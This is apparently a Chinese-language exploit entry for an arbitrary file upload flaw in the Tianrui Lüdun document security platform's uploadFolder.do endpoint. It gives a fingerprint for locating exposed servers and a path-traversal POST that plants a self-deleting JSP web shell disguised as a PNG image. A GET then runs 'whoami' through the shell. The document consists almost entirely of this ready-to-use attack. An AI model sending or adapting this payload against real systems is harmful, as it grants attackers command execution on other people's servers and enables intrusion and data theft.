# 天锐绿盘文档安全管理平台uploadFolder.do存在文件上传致RCE漏洞

- **系统**：天锐绿盾　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/lddsm/"`
- **请求**：`POST /lddsm/service/../admin/activiti/uploadFolder.do?taskId=../webapps/ROOT/&relativepath=1&path=1 HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlA…`

**请求体 / payload**
```
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="rce.jsp"
Content-Type: image/png
<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
GET /rce.jsp?cmd=whoami HTTP/1.1
Host:
```
- **预期**：200　|　—